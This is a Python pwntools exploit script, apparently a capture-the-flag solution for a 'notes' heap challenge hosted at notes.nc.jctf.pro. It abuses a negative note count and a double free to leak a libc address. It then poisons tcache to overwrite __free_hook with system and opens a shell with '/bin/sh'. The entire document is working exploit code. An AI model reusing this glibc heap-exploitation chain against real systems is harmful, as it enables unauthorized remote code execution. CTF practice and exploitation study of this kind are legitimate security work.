from pwn import *
import sys

libc = ELF("libc-2.31.so")
elf = ELF("notes_patched")

if sys.argv[1] == "r":
    p = remote("notes.nc.jctf.pro", 5001)
else:
    p = process("./notes_patched")
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, """
            continue
            """)

def add(size, content):
    p.sendlineafter("> ", str(1))
    p.sendlineafter("size: ", str(size))
    p.sendafter("content: ", content)

def delete(idx):
    p.sendlineafter("> ", str(2))
    p.sendlineafter("id: ", str(idx))

def view(idx):
    p.sendlineafter("> ", str(3))
    p.sendlineafter("id: ", str(idx))

def solve():
    num_notes = -100
    p.sendlineafter("(0-10): ", str(num_notes))

    for i in range(10):
       add(0x70, "A"*0x70) 


    for i in range(9):
        delete(i)
    delete(7)   # double free

    # leak libc
    for i in range(8):
        add(0x100, "A"*0x100)
    for i in range(11, 18):
        delete(i)
    delete(10)
    view(10)

    libc.address = u64(p.recv(6) + "\x00\x00") - 0x1ecbe0
    system = libc.symbols["system"]
    binsh = next(libc.search("/bin/sh"))
    free_hook = libc.symbols["__free_hook"]
    success("libc: %s"%hex(libc.address))
    success("system: %s"%hex(system))
    success("/bin/sh: %s"%hex(binsh))
    success("free_hook: %s"%hex(free_hook))

    # drain all tcache
    for i in range(7):
        add(0x70, "A"*0x70)

    add(0x70, p64(free_hook) + "\n")

    add(0x70, "\n")
    add(0x70, "/bin/sh\x00" + p64(0)*13)
    add(0x70, p64(system) + "\n")
    delete(27)


    p.interactive()

if __name__ == "__main__":
    solve()
